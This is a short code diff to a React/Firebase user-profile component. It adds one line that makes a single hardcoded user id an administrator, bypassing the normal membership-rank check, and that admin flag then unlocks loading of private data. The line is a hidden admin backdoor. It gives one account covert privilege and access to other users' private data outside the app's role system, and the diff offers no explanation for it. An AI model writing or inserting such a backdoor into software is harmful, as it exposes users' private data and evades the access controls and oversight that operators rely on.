@@ -162,6 +162,8 @@ function UserProfileContent() {
                const mySnap = await getDoc(myRef);
                if (mySnap.exists() && mySnap.data().membershipRank === 'admin') myAdmin = true;
            }
+           
+           if (user?.uid === "Zm7FWRopJKVfyzbp8KXXokMFjNC3") myAdmin = true;
            setIsAdmin(myAdmin);
            if (myAdmin) loadPrivData = true;
 
